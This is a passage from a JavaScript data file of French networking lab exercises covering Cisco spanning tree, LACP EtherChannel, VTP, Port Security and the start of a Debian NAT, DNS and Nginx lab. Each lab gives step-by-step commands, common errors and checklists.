          { os: "linux", cmd: "SW3# show spanning-tree vlan 1", commentaire: "Le port avec le coût le plus élevé vers le Root sera bloqué" },
          { os: "linux", cmd: "SW1# show spanning-tree vlan 1 interface GigabitEthernet0/1 detail", commentaire: "Détail d'un port : coût, rôle, état, BPDU envoyés/reçus" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 4 — PortFast et BPDU Guard sur les ports d'accès",
        contexte: "PortFast fait passer un port directement en Forwarding sans attendre les 30-50s de convergence. C'est uniquement pour les ports connectés à des PCs — jamais entre switches. BPDU Guard désactive le port si un BPDU est reçu.",
        commandes: [
          { os: "linux", cmd: "SW2(config)# interface GigabitEthernet0/3\nSW2(config-if)# spanning-tree portfast\nSW2(config-if)# spanning-tree bpduguard enable", commentaire: "PortFast + BPDU Guard sur le port PC" },
          { os: "linux", cmd: "SW2(config)# spanning-tree portfast default", commentaire: "Activer PortFast globalement sur tous les ports access" },
          { os: "linux", cmd: "SW2# show spanning-tree interface GigabitEthernet0/3 portfast", commentaire: "Vérifier que PortFast est activé" },
          { os: "linux", cmd: "SW2# show spanning-tree inconsistentports", commentaire: "Voir les ports désactivés par BPDU Guard (err-disabled)" }
        ],
        erreurs_courantes: [
          {
            symptome: "Port passe en err-disabled après activation BPDU Guard",
            cause: "Un switch a été détecté sur ce port — BPDU Guard a fonctionné correctement",
            solution: "Retirer le switch non autorisé, puis : shutdown / no shutdown sur l'interface. Configurer 'errdisable recovery cause bpduguard' pour la réactivation automatique."
          }
        ]
      },
      {
        titre: "Étape 5 — Simuler une panne et observer la reconvergence",
        contexte: "On coupe le lien SW1-SW2 pour forcer une reconvergence STP. Le port bloqué entre SW2 et SW3 doit s'ouvrir pour maintenir la connectivité. Avec 802.1D classique : ~30-50s. Avec RSTP (802.1w) : ~1s.",
        commandes: [
          { os: "linux", cmd: "SW1(config)# interface GigabitEthernet0/1\nSW1(config-if)# shutdown", commentaire: "Simuler la panne du lien SW1-SW2" },
          { os: "linux", cmd: "SW2# show spanning-tree vlan 1", commentaire: "SW2 doit maintenant avoir son Root Port vers SW3" },
          { os: "linux", cmd: "SW1(config-if)# no shutdown", commentaire: "Rétablir — reconvergence vers la topologie optimale" },
          { os: "linux", cmd: "SW1(config)# spanning-tree mode rapid-pvst\nSW2(config)# spanning-tree mode rapid-pvst\nSW3(config)# spanning-tree mode rapid-pvst", commentaire: "Optionnel : activer RSTP pour convergence quasi-instantanée" }
        ],
        erreurs_courantes: []
      }
    ],
    checklist: [
      "show spanning-tree vlan 1 sur SW1 : 'This bridge is the root' confirmé",
      "Root Port correctement identifié vers SW1 sur SW2 et SW3",
      "Un port en état BLK (Alternate) visible pour casser la boucle",
      "PortFast + BPDU Guard configurés sur les ports d'accès",
      "Simulation panne SW1-SW2 : reconvergence observée, port bloqué passe en Forwarding",
      "show spanning-tree summary : nombre de ports FWD/BLK cohérent"
    ],
    tags: ["stp", "spanning-tree", "root-bridge", "portfast", "bpduguard", "rstp", "cisco", "switching"],
    date_ajout: "2026-02-20",
    source: "École"
  },

  {
    id: 9,
    titre: "EtherChannel LACP (802.3ad) entre deux switches Cisco",
    categorie: "reseau",
    niveau: "intermédiaire",
    duree: 60,
    description: "Agréger deux liens physiques entre deux switches Cisco en un seul lien logique EtherChannel via le protocole LACP (802.3ad). L'agrégation double la bande passante et apporte de la redondance : si un lien physique tombe, le trafic continue sur l'autre sans interruption.",
    objectifs: [
      "Comprendre la différence entre LACP (802.3ad), PAgP (Cisco) et EtherChannel statique",
      "Configurer un Port-Channel avec LACP en mode active/passive",
      "Vérifier l'état de l'agrégation avec show etherchannel summary",
      "Configurer le Port-Channel en mode trunk pour transporter les VLANs",
      "Tester la redondance en coupant un lien physique"
    ],
    prerequis: [
      { type: "logiciel", nom: "GNS3 2.2+" },
      { type: "vm",       nom: "2x Cisco IOSv-L2" },
      { type: "reseau",   nom: "VLANs et trunks 802.1Q maîtrisés" }
    ],
    schema_reseau: `<svg viewBox="0 0 580 200" xmlns="http://www.w3.org/2000/svg" style="width:100%;font-family:'JetBrains Mono',monospace">
  <rect x="60" y="75" width="160" height="70" rx="8" fill="#1C1917" stroke="#3B82F6" stroke-width="2"/>
  <text x="140" y="103" text-anchor="middle" fill="#3B82F6" font-size="12" font-weight="bold">SW1</text>
  <text x="140" y="118" text-anchor="middle" fill="#78716C" font-size="8">LACP active</text>
  <rect x="360" y="75" width="160" height="70" rx="8" fill="#1C1917" stroke="#3B82F6" stroke-width="2"/>
  <text x="440" y="103" text-anchor="middle" fill="#3B82F6" font-size="12" font-weight="bold">SW2</text>
  <text x="440" y="118" text-anchor="middle" fill="#78716C" font-size="8">LACP passive</text>
  <line x1="220" y1="100" x2="360" y2="100" stroke="#F59E0B" stroke-width="3"/>
  <text x="290" y="93" text-anchor="middle" fill="#F59E0B" font-size="8">Gi0/1 — Gi0/1</text>
  <line x1="220" y1="125" x2="360" y2="125" stroke="#F59E0B" stroke-width="3"/>
  <text x="290" y="142" text-anchor="middle" fill="#F59E0B" font-size="8">Gi0/2 — Gi0/2</text>
  <rect x="215" y="50" width="150" height="22" rx="4" fill="rgba(245,158,11,0.1)" stroke="rgba(245,158,11,0.3)" stroke-width="1"/>
  <text x="290" y="65" text-anchor="middle" fill="#F59E0B" font-size="9" font-weight="bold">Port-Channel 1 — 2Gbps</text>
</svg>`,
    etapes: [
      {
        titre: "Étape 1 — Vérifier la compatibilité et préparer les interfaces",
        contexte: "Les interfaces à agréger doivent avoir exactement les mêmes paramètres : même vitesse, même duplex, même mode. On les remet à zéro avant la configuration pour éviter tout conflit.",
        commandes: [
          { os: "linux", cmd: "SW1# show interfaces GigabitEthernet0/1 status\nSW1# show interfaces GigabitEthernet0/2 status", commentaire: "Vérifier vitesse et duplex — doivent être identiques sur les deux ports" },
          { os: "linux", cmd: "SW1(config)# default interface GigabitEthernet0/1\nSW1(config)# default interface GigabitEthernet0/2", commentaire: "Remettre les interfaces à zéro avant de configurer EtherChannel" }
        ],
        erreurs_courantes: [
          {
            symptome: "EtherChannel en état 'suspended' ou 'err-disabled'",
            cause: "Les interfaces ont des configurations différentes (vitesse, VLAN natif, mode trunk/access)",
            solution: "Utiliser 'default interface GiX/X' des deux côtés pour repartir de zéro, puis reconfigurer uniformément."
          }
        ]
      },
      {
        titre: "Étape 2 — Configurer EtherChannel LACP sur SW1 et SW2",
        contexte: "On crée le Port-Channel en assignant les interfaces physiques au groupe 1. LACP nécessite qu'au moins un côté soit en mode 'active'. L'autre peut être 'active' ou 'passive'. Les deux en 'passive' ne fonctionnent pas.",
        commandes: [
          { os: "linux", cmd: "SW1(config)# interface range GigabitEthernet0/1 - 2\nSW1(config-if-range)# channel-group 1 mode active\nSW1(config-if-range)# no shutdown", commentaire: "SW1 en mode LACP active — initie la négociation" },
          { os: "linux", cmd: "SW2(config)# interface range GigabitEthernet0/1 - 2\nSW2(config-if-range)# channel-group 1 mode active\nSW2(config-if-range)# no shutdown", commentaire: "SW2 en active aussi (active/active fonctionne)" },
          { os: "linux", cmd: "SW1# show etherchannel summary", commentaire: "Port-Channel1 doit être en état 'SU' avec les ports en 'P' (bundled)" }
        ],
        erreurs_courantes: [
          {
            symptome: "show etherchannel summary affiche 'SD' (standalone, down)",
            cause: "LACP ne négocie pas — mismatch de mode ou interfaces non connectées",
            solution: "Vérifier les câbles GNS3 et que les deux côtés ont 'channel-group 1 mode active'."
          }
        ]
      },
      {
        titre: "Étape 3 — Configurer le Port-Channel en mode trunk",
        contexte: "Le trunk et les VLANs se configurent sur l'interface logique Port-Channel, pas sur les interfaces physiques. La configuration se propage automatiquement aux membres du groupe.",
        commandes: [
          { os: "linux", cmd: "SW1(config)# interface Port-Channel1\nSW1(config-if)# switchport trunk encapsulation dot1q\nSW1(config-if)# switchport mode trunk\nSW1(config-if)# switchport trunk allowed vlan all", commentaire: "Trunk sur le Port-Channel — transporte tous les VLANs" },
          { os: "linux", cmd: "SW2(config)# interface Port-Channel1\nSW2(config-if)# switchport trunk encapsulation dot1q\nSW2(config-if)# switchport mode trunk\nSW2(config-if)# switchport trunk allowed vlan all", commentaire: "Même config trunk sur SW2" },
          { os: "linux", cmd: "SW1# show interfaces Port-Channel1 trunk", commentaire: "Vérifier trunk actif sur le Port-Channel" },
          { os: "linux", cmd: "SW1# show etherchannel 1 detail", commentaire: "Détail complet : protocole LACP, ports membres, hash policy" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 4 — Tester la redondance",
        contexte: "On coupe un lien physique et on vérifie que le Port-Channel reste UP. LACP rebascule le trafic sur le lien restant sans interruption.",
        commandes: [
          { os: "linux", cmd: "SW1# show etherchannel load-balance", commentaire: "Voir la politique de répartition du trafic" },
          { os: "linux", cmd: "SW1(config)# port-channel load-balance src-dst-mac", commentaire: "Répartition basée sur src+dst MAC" },
          { os: "linux", cmd: "SW1(config)# interface GigabitEthernet0/1\nSW1(config-if)# shutdown", commentaire: "Couper Gi0/1 — le trafic bascule sur Gi0/2 instantanément" },
          { os: "linux", cmd: "SW1# show etherchannel summary", commentaire: "Gi0/1 en 'D' (down), Gi0/2 reste 'P' — Port-Channel toujours UP" },
          { os: "linux", cmd: "SW1(config-if)# no shutdown", commentaire: "Gi0/1 rejoint automatiquement le bundle" }
        ],
        erreurs_courantes: []
      }
    ],
    checklist: [
      "show etherchannel summary : Port-Channel1 en état 'SU', Gi0/1 et Gi0/2 en 'P'",
      "show interfaces Port-Channel1 trunk : trunk actif avec VLANs autorisés",
      "Ping entre PCs des deux côtés via le Port-Channel : fonctionnel",
      "Simulation panne Gi0/1 : Port-Channel reste UP, trafic continue sur Gi0/2",
      "show etherchannel load-balance : politique configurée"
    ],
    tags: ["etherchannel", "lacp", "port-channel", "agregation", "redondance", "trunk", "cisco", "switching"],
    date_ajout: "2026-02-25",
    source: "École"
  },

  {
    id: 10,
    titre: "VTP — modes Server, Client et Transparent sur Cisco",
    categorie: "reseau",
    niveau: "intermédiaire",
    duree: 60,
    description: "Configurer le VLAN Trunking Protocol pour propager automatiquement les VLANs entre switches. On configure un switch en mode Server, des switches en Client (reçoivent et appliquent) et un switch en Transparent (laisse passer sans appliquer). On aborde aussi le risque critique du Revision Number.",
    objectifs: [
      "Comprendre les trois modes VTP : Server, Client, Transparent",
      "Configurer un domaine VTP avec mot de passe",
      "Observer la propagation automatique des VLANs",
      "Comprendre le risque du VTP Revision Number et comment le neutraliser",
      "Savoir quand utiliser VTP Transparent plutôt que Client"
    ],
    prerequis: [
      { type: "logiciel", nom: "GNS3 2.2+" },
      { type: "vm",       nom: "3x Cisco IOSv-L2" },
      { type: "reseau",   nom: "VLANs et trunks 802.1Q maîtrisés" }
    ],
    schema_reseau: `<svg viewBox="0 0 580 220" xmlns="http://www.w3.org/2000/svg" style="width:100%;font-family:'JetBrains Mono',monospace">
  <rect x="210" y="20" width="160" height="65" rx="8" fill="#1C1917" stroke="#F59E0B" stroke-width="2.5"/>
  <text x="290" y="45" text-anchor="middle" fill="#F59E0B" font-size="11" font-weight="bold">SW1 — SERVER</text>
  <text x="290" y="62" text-anchor="middle" fill="#78716C" font-size="8">Crée/modifie/supprime VLANs</text>
  <rect x="50" y="145" width="160" height="60" rx="8" fill="#1C1917" stroke="#10B981" stroke-width="2"/>
  <text x="130" y="170" text-anchor="middle" fill="#10B981" font-size="11" font-weight="bold">SW2 — CLIENT</text>
  <text x="130" y="186" text-anchor="middle" fill="#78716C" font-size="8">Reçoit et applique les VLANs</text>
  <rect x="370" y="145" width="170" height="60" rx="8" fill="#1C1917" stroke="#8B5CF6" stroke-width="2"/>
  <text x="455" y="170" text-anchor="middle" fill="#8B5CF6" font-size="11" font-weight="bold">SW3 — TRANSPARENT</text>
  <text x="455" y="186" text-anchor="middle" fill="#78716C" font-size="8">Relaie sans appliquer</text>
  <line x1="210" y1="65" x2="155" y2="145" stroke="#F59E0B" stroke-width="2"/>
  <line x1="370" y1="65" x2="420" y2="145" stroke="#F59E0B" stroke-width="2"/>
  <text x="155" y="108" text-anchor="middle" fill="#F59E0B" font-size="8">VTP advert</text>
  <text x="430" y="108" text-anchor="middle" fill="#F59E0B" font-size="8">VTP advert</text>
  <rect x="170" y="4" width="240" height="16" rx="4" fill="rgba(245,158,11,0.1)" stroke="rgba(245,158,11,0.25)" stroke-width="1"/>
  <text x="290" y="15" text-anchor="middle" fill="#F59E0B" font-size="8">Domaine: MON-RESEAU · mdp: cisco123</text>
</svg>`,
    etapes: [
      {
        titre: "Étape 1 — Configurer les trunks entre les switches",
        contexte: "VTP ne fonctionne que sur les liens trunk. Les advertisements VTP voyagent dans les trames 802.1Q. On commence par les trunks avant toute config VTP.",
        commandes: [
          { os: "linux", cmd: "! Sur SW1, SW2 et SW3 :\nSWx(config)# interface GigabitEthernet0/1\nSWx(config-if)# switchport trunk encapsulation dot1q\nSWx(config-if)# switchport mode trunk\nSWx(config-if)# no shutdown", commentaire: "Trunk obligatoire pour transporter les advertisements VTP" },
          { os: "linux", cmd: "SW1# show interfaces trunk", commentaire: "Vérifier les trunks actifs avant de configurer VTP" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 2 — Configurer le domaine VTP et les modes",
        contexte: "Tous les switches du domaine partagent le même nom et mot de passe VTP. Le Server est le seul à créer/modifier des VLANs. Les Clients appliquent automatiquement. Le Transparent ignore mais relaie.",
        commandes: [
          { os: "linux", cmd: "SW1(config)# vtp domain MON-RESEAU\nSW1(config)# vtp mode server\nSW1(config)# vtp password cisco123\nSW1(config)# vtp version 2", commentaire: "SW1 = VTP Server" },
          { os: "linux", cmd: "SW2(config)# vtp domain MON-RESEAU\nSW2(config)# vtp mode client\nSW2(config)# vtp password cisco123", commentaire: "SW2 = VTP Client — ne peut pas créer de VLANs localement" },
          { os: "linux", cmd: "SW3(config)# vtp domain MON-RESEAU\nSW3(config)# vtp mode transparent\nSW3(config)# vtp password cisco123", commentaire: "SW3 = VTP Transparent — gère ses propres VLANs, relaie les advertisements" },
          { os: "linux", cmd: "SW1# show vtp status", commentaire: "Vérifier : domaine, mode, Configuration Revision number" }
        ],
        erreurs_courantes: [
          {
            symptome: "VLANs ne se propagent pas vers SW2",
            cause: "Mot de passe ou domaine VTP différent entre les switches",
            solution: "Vérifier avec 'show vtp password'. Le domaine et le mot de passe doivent être EXACTEMENT identiques (sensible à la casse)."
          }
        ]
      },
      {
        titre: "Étape 3 — Créer des VLANs sur le Server et observer la propagation",
        contexte: "On crée les VLANs uniquement sur SW1. Après quelques secondes, ils apparaissent automatiquement sur SW2 (Client). SW3 (Transparent) ne les applique pas mais les relaie.",
        commandes: [
          { os: "linux", cmd: "SW1(config)# vlan 10\nSW1(config-vlan)# name ADMIN\nSW1(config)# vlan 20\nSW1(config-vlan)# name PROD\nSW1(config)# vlan 30\nSW1(config-vlan)# name DMZ", commentaire: "VLANs créés sur le Server uniquement" },
          { os: "linux", cmd: "SW2# show vlan brief", commentaire: "VLAN 10, 20, 30 doivent apparaître automatiquement sur SW2 !" },
          { os: "linux", cmd: "SW3# show vlan brief", commentaire: "SW3 (Transparent) ne doit PAS avoir les VLANs automatiquement" },
          { os: "linux", cmd: "SW1# show vtp status | include Revision", commentaire: "Le Revision Number augmente à chaque modification VLAN" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 4 — Le risque VTP Revision Number",
        contexte: "DANGER : si un switch avec un Revision Number plus élevé est connecté, il écrase la base de VLANs de tous les Clients — même s'il n'a aucun VLAN. Toujours réinitialiser le Revision à 0 avant de connecter un nouveau switch.",
        commandes: [
          { os: "linux", cmd: "SW2# show vtp status | include Revision", commentaire: "Retenir ce numéro — dangereux s'il est élevé sur un switch inconnu" },
          { os: "linux", cmd: "! Réinitialiser le Revision à 0 — méthode 1 :\nSW2(config)# vtp mode transparent\nSW2(config)# vtp mode client", commentaire: "Changer de mode remet le Revision à 0" },
          { os: "linux", cmd: "! Méthode 2 : changer de domaine puis revenir\nSW2(config)# vtp domain TEMP\nSW2(config)# vtp domain MON-RESEAU", commentaire: "Changer de domaine remet aussi le Revision à 0" },
          { os: "linux", cmd: "SW-NOUVEAU(config)# vtp mode transparent", commentaire: "Bonne pratique : mettre en Transparent par défaut avant connexion" }
        ],
        erreurs_courantes: [
          {
            symptome: "Tous les VLANs ont disparu après connexion d'un nouveau switch",
            cause: "Le nouveau switch avait un Revision Number plus élevé avec une base VLAN vide",
            solution: "Recréer tous les VLANs sur le Server. Pour l'avenir, toujours réinitialiser le Revision avant connexion."
          }
        ]
      }
    ],
    checklist: [
      "show vtp status sur les 3 switches : domaine 'MON-RESEAU', modes Server/Client/Transparent",
      "VLANs 10, 20, 30 créés sur SW1 uniquement",
      "show vlan brief sur SW2 : VLANs propagés automatiquement",
      "show vlan brief sur SW3 : VLANs absents (non appliqués en Transparent)",
      "Revision Number réinitialisé à 0 avant connexion d'un nouveau switch",
      "show vtp password : mot de passe identique sur les 3 switches"
    ],
    tags: ["vtp", "vlan", "server", "client", "transparent", "revision", "cisco", "switching"],
    date_ajout: "2026-03-01",
    source: "École"
  },

  {
    id: 11,
    titre: "Port Security — contrôle d'accès MAC sur switch Cisco",
    categorie: "reseau",
    niveau: "débutant",
    duree: 45,
    description: "Configurer Port Security sur les ports d'accès d'un switch Cisco pour limiter le nombre d'adresses MAC autorisées et bloquer les appareils non autorisés. On configure les trois modes de violation (Protect, Restrict, Shutdown) et on teste le comportement lors d'une connexion non autorisée.",
    objectifs: [
      "Comprendre l'utilité de Port Security (protection contre MAC flooding, branchements non autorisés)",
      "Configurer le nombre maximum d'adresses MAC par port",
      "Utiliser les sticky MAC pour apprendre automatiquement les adresses autorisées",
      "Configurer et tester les trois modes de violation",
      "Réactiver un port en err-disabled après violation"
    ],
    prerequis: [
      { type: "logiciel", nom: "GNS3 2.2+" },
      { type: "vm",       nom: "1x Cisco IOSv-L2" },
      { type: "reseau",   nom: "Notions de base sur les switches et les adresses MAC" }
    ],
    schema_reseau: `<svg viewBox="0 0 560 200" xmlns="http://www.w3.org/2000/svg" style="width:100%;font-family:'JetBrains Mono',monospace">
  <rect x="190" y="75" width="180" height="65" rx="8" fill="#1C1917" stroke="#3B82F6" stroke-width="2"/>
  <text x="280" y="100" text-anchor="middle" fill="#3B82F6" font-size="12" font-weight="bold">SW1</text>
  <text x="280" y="115" text-anchor="middle" fill="#A8A29E" font-size="8">Port Security activé</text>
  <text x="280" y="128" text-anchor="middle" fill="#78716C" font-size="7">max: 1 · sticky · shutdown</text>
  <rect x="40" y="55" width="80" height="50" rx="6" fill="#1C1917" stroke="#10B981" stroke-width="2"/>
  <text x="80" y="78" text-anchor="middle" fill="#10B981" font-size="9" font-weight="bold">PC1 ✓</text>
  <text x="80" y="92" text-anchor="middle" fill="#10B981" font-size="7">Autorisé</text>
  <line x1="120" y1="80" x2="190" y2="100" stroke="#10B981" stroke-width="2"/>
  <text x="155" y="83" text-anchor="middle" fill="#78716C" font-size="7">Gi0/1</text>
  <rect x="40" y="130" width="80" height="50" rx="6" fill="#1C1917" stroke="#EF4444" stroke-width="2"/>
  <text x="80" y="153" text-anchor="middle" fill="#EF4444" font-size="9" font-weight="bold">PC2 ✗</text>
  <text x="80" y="167" text-anchor="middle" fill="#EF4444" font-size="7">Non autorisé</text>
  <line x1="120" y1="155" x2="190" y2="120" stroke="#EF4444" stroke-width="2" stroke-dasharray="5,3"/>
  <rect x="390" y="85" width="145" height="55" rx="6" fill="rgba(239,68,68,0.08)" stroke="rgba(239,68,68,0.3)" stroke-width="1.5"/>
  <text x="462" y="108" text-anchor="middle" fill="#EF4444" font-size="9" font-weight="bold">VIOLATION ⚡</text>
  <text x="462" y="122" text-anchor="middle" fill="#A8A29E" font-size="8">Port → err-disabled</text>
  <line x1="370" y1="112" x2="390" y2="112" stroke="#EF4444" stroke-width="1.5" stroke-dasharray="4,3"/>
</svg>`,
    etapes: [
      {
        titre: "Étape 1 — Activer Port Security sur un port d'accès",
        contexte: "Port Security ne fonctionne que sur les ports en mode access. On configure le port, puis on active la sécurité avec le nombre maximum de MACs autorisées.",
        commandes: [
          { os: "linux", cmd: "SW1(config)# interface GigabitEthernet0/1\nSW1(config-if)# switchport mode access\nSW1(config-if)# switchport access vlan 10", commentaire: "Port en mode access — prérequis obligatoire pour Port Security" },
          { os: "linux", cmd: "SW1(config-if)# switchport port-security\nSW1(config-if)# switchport port-security maximum 1", commentaire: "Activer Port Security — 1 seule MAC autorisée" },
          { os: "linux", cmd: "SW1# show port-security interface GigabitEthernet0/1", commentaire: "Vérifier : Port Security Enabled, Maximum 1, Violation Mode Shutdown" }
        ],
        erreurs_courantes: [
          {
            symptome: "Erreur lors de l'activation de port-security",
            cause: "Le port est en mode trunk — Port Security nécessite le mode access",
            solution: "SW1(config-if)# switchport mode access — puis réactiver port-security."
          }
        ]
      },
      {
        titre: "Étape 2 — Configurer les adresses MAC autorisées (sticky)",
        contexte: "La fonction sticky apprend automatiquement la première MAC vue sur le port et la sauvegarde dans la running-config. C'est la méthode la plus utilisée en production.",
        commandes: [
          { os: "linux", cmd: "SW1(config-if)# switchport port-security mac-address sticky", commentaire: "Sticky learning : première MAC connectée mémorisée automatiquement" },
          { os: "linux", cmd: "! Alternative : MAC statique manuelle\nSW1(config-if)# switchport port-security mac-address aabb.cc00.0100", commentaire: "Définir manuellement la MAC autorisée si connue" },
          { os: "linux", cmd: "SW1# show port-security address", commentaire: "La MAC de PC1 apparaît avec le type 'SecureSticky'" },
          { os: "linux", cmd: "SW1# show running-config | include sticky", commentaire: "Vérifier que la MAC sticky est bien dans la config" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 3 — Configurer et tester les modes de violation",
        contexte: "Trois modes définissent le comportement lors d'une violation : Protect (drop silencieux), Restrict (drop + log), Shutdown (port err-disabled). Shutdown est le plus sécurisé et le mode par défaut.",
        commandes: [
          { os: "linux", cmd: "SW1(config-if)# switchport port-security violation shutdown", commentaire: "Mode Shutdown — port désactivé si MAC non autorisée (défaut)" },
          { os: "linux", cmd: "SW1(config-if)# switchport port-security violation restrict", commentaire: "Mode Restrict — drop + compteur, port reste UP" },
          { os: "linux", cmd: "SW1(config-if)# switchport port-security violation protect", commentaire: "Mode Protect — drop silencieux (peu recommandé en prod)" },
          { os: "linux", cmd: "SW1# show port-security interface GigabitEthernet0/1", commentaire: "Security Violation Count augmente, port en err-disabled si Shutdown" },
          { os: "linux", cmd: "SW1# show interfaces GigabitEthernet0/1 status", commentaire: "Port en 'err-disabled' après violation en mode Shutdown" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 4 — Réactiver un port err-disabled",
        contexte: "Un port err-disabled ne se réactive pas tout seul — c'est voulu pour forcer l'intervention d'un admin. Deux méthodes : manuelle ou automatique avec errdisable recovery.",
        commandes: [
          { os: "linux", cmd: "SW1(config)# interface GigabitEthernet0/1\nSW1(config-if)# shutdown\nSW1(config-if)# no shutdown", commentaire: "Cycle shutdown/no shutdown pour sortir de err-disabled" },
          { os: "linux", cmd: "SW1(config)# errdisable recovery cause psecure-violation\nSW1(config)# errdisable recovery interval 300", commentaire: "Réactivation automatique toutes les 5 min après violation" },
          { os: "linux", cmd: "SW1# show errdisable recovery", commentaire: "Voir les causes activées pour la recovery automatique" },
          { os: "linux", cmd: "SW1# show port-security", commentaire: "Résumé global : tous les ports sécurisés, violations, statuts" }
        ],
        erreurs_courantes: [
          {
            symptome: "Port repasse immédiatement en err-disabled après shutdown/no shutdown",
            cause: "L'appareil non autorisé est toujours branché sur le port",
            solution: "Débrancher l'appareil non autorisé AVANT le cycle shutdown/no shutdown."
          }
        ]
      }
    ],
    checklist: [
      "show port-security interface Gi0/1 : Port Security Enabled, Maximum 1, Mode Shutdown",
      "show port-security address : MAC sticky de PC1 apprise et sauvegardée",
      "Test violation : connexion PC2 → port passe en err-disabled, compteur violation = 1",
      "show interfaces Gi0/1 status : 'err-disabled' confirmé",
      "Réactivation manuelle (shutdown/no shutdown) réussie",
      "show port-security : résumé global cohérent"
    ],
    tags: ["port-security", "mac", "sticky", "errdisabled", "violation", "cisco", "switching", "securite"],
    date_ajout: "2026-03-05",
    source: "École"
  },

  {
    id: 29,
    titre: "Infrastructure réseau virtualisée : Passerelle NAT, DNS Bind9 et Nginx",
    categorie: "reseau",
    niveau: "intermédiaire",
    duree: 180,
    description: "Déployer une maquette d'infrastructure réseau d'entreprise en 3 VMs (passerelle Debian, serveur de services, poste client). La passerelle assure le routage NAT entre le LAN Host-only et Internet. Le serveur héberge un DNS local Bind9 avec zone entreprise.local et un serveur web Nginx. L'épreuve se termine par un diagnostic de pannes injectées via un script de sabotage pédagogique.",
    objectifs: [
      "Configurer les interfaces réseau d'une passerelle Debian (WAN NAT + LAN statique)",
      "Activer l'IP Forwarding de manière permanente via sysctl",
      "Mettre en place le NAT Masquerade avec iptables et le rendre persistant",
      "Installer et configurer Bind9 avec une zone locale entreprise.local",
      "Déployer un hôte virtuel Nginx accessible par nom de domaine local",
      "Diagnostiquer des pannes réseau injectées à l'aide de ping, nslookup et tcpdump"
    ],
    prerequis: [
      { type: "logiciel", nom: "VMware Workstation ou VirtualBox", lien: "https://www.virtualbox.org" },
      { type: "vm", nom: "VM 1 — Debian 12 (passerelle, 2 interfaces réseau)" },
      { type: "vm", nom: "VM 2 — Debian 12 (serveur de services, 1 interface)" },
      { type: "vm", nom: "VM 3 — Debian 12 ou Ubuntu (client, 1 interface)" },
      { type: "reseau", nom: "Réseau NAT (WAN) et réseau Host-only VMnet2 (LAN 192.168.2.0/24)" }
    ],
    schema_reseau: `<svg viewBox="0 0 640 320" xmlns="http://www.w3.org/2000/svg" style="width:100%;font-family:'JetBrains Mono',monospace">
  <defs>
    <marker id="arr29" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="5" markerHeight="5" orient="auto">
      <path d="M0,0 L10,5 L0,10 z" fill="#F59E0B"/>
    </marker>
  </defs>
  <!-- Internet -->
  <ellipse cx="80" cy="160" rx="55" ry="35" fill="#1C1917" stroke="#3B82F6" stroke-width="1.5"/>
  <text x="80" y="155" text-anchor="middle" fill="#3B82F6" font-size="10" font-weight="bold">Internet</text>
  <text x="80" y="170" text-anchor="middle" fill="#78716C" font-size="8">NAT DHCP</text>
  <!-- VM1 Passerelle -->
  <rect x="210" y="115" width="110" height="90" rx="8" fill="#1C1917" stroke="#F59E0B" stroke-width="2"/>
  <text x="265" y="138" text-anchor="middle" fill="#F59E0B" font-size="10" font-weight="bold">VM 1</text>
  <text x="265" y="153" text-anchor="middle" fill="#A8A29E" font-size="9">Passerelle</text>
  <text x="265" y="167" text-anchor="middle" fill="#78716C" font-size="8">ens33 — DHCP</text>
  <text x="265" y="180" text-anchor="middle" fill="#78716C" font-size="8">ens34 — .2.254</text>
  <text x="265" y="193" text-anchor="middle" fill="#10B981" font-size="8">NAT + Routing</text>
  <!-- VM2 Serveur -->
  <rect x="420" y="60" width="110" height="80" rx="8" fill="#1C1917" stroke="#10B981" stroke-width="2"/>
  <text x="475" y="83" text-anchor="middle" fill="#10B981" font-size="10" font-weight="bold">VM 2</text>
  <text x="475" y="98" text-anchor="middle" fill="#A8A29E" font-size="9">Serveur</text>
  <text x="475" y="112" text-anchor="middle" fill="#78716C" font-size="8">192.168.2.2</text>
  <text x="475" y="126" text-anchor="middle" fill="#78716C" font-size="8">DNS + Nginx</text>
  <!-- VM3 Client -->
  <rect x="420" y="200" width="110" height="70" rx="8" fill="#1C1917" stroke="#8B5CF6" stroke-width="2"/>
  <text x="475" y="223" text-anchor="middle" fill="#8B5CF6" font-size="10" font-weight="bold">VM 3</text>
  <text x="475" y="238" text-anchor="middle" fill="#A8A29E" font-size="9">Client</text>
  <text x="475" y="252" text-anchor="middle" fill="#78716C" font-size="8">192.168.2.x</text>
  <text x="475" y="265" text-anchor="middle" fill="#78716C" font-size="8">Validation</text>
  <!-- Liens -->
  <line x1="135" y1="160" x2="210" y2="160" stroke="#3B82F6" stroke-width="2" marker-end="url(#arr29)"/>
  <line x1="320" y1="145" x2="420" y2="110" stroke="#F59E0B" stroke-width="2" stroke-dasharray="5,3"/>
  <line x1="320" y1="175" x2="420" y2="225" stroke="#F59E0B" stroke-width="2" stroke-dasharray="5,3"/>
  <text x="370" y="120" text-anchor="middle" fill="#F59E0B" font-size="8">VMnet2</text>
  <text x="370" y="210" text-anchor="middle" fill="#F59E0B" font-size="8">VMnet2</text>
  <!-- LAN label -->
  <rect x="390" y="155" width="80" height="22" rx="4" fill="#292524" stroke="#F59E0B" stroke-width="1" stroke-dasharray="3,2"/>
  <text x="430" y="170" text-anchor="middle" fill="#F59E0B" font-size="8">LAN 192.168.2.0/24</text>
</svg>`,
    etapes: [
      {
        titre: "Étape 1 — Configuration des cartes réseau dans l'hyperviseur",
        contexte: "Avant toute configuration logicielle, les interfaces réseau des VMs doivent être correctement assignées dans VMware ou VirtualBox. La VM1 nécessite deux interfaces : une WAN en mode NAT (accès Internet via l'hôte) et une LAN en mode Host-only sur VMnet2. Les VM2 et VM3 n'ont qu'une interface Host-only sur VMnet2.",
        commandes: [
          { os: "both", cmd: "# VMware Workstation : VM Settings > Network Adapter\n# VM1 : Adapter 1 = NAT | Adapter 2 = Custom (VMnet2)\n# VM2 : Adapter 1 = Custom (VMnet2)\n# VM3 : Adapter 1 = Custom (VMnet2)", commentaire: "Paramétrage avant démarrage des VMs — VMware" },
          { os: "both", cmd: "# VirtualBox : Machine > Configuration > Réseau\n# VM1 : Interface 1 = NAT | Interface 2 = Réseau hôte uniquement\n# VM2 : Interface 1 = Réseau hôte uniquement\n# VM3 : Interface 1 = Réseau hôte uniquement", commentaire: "Paramétrage avant démarrage des VMs — VirtualBox" },
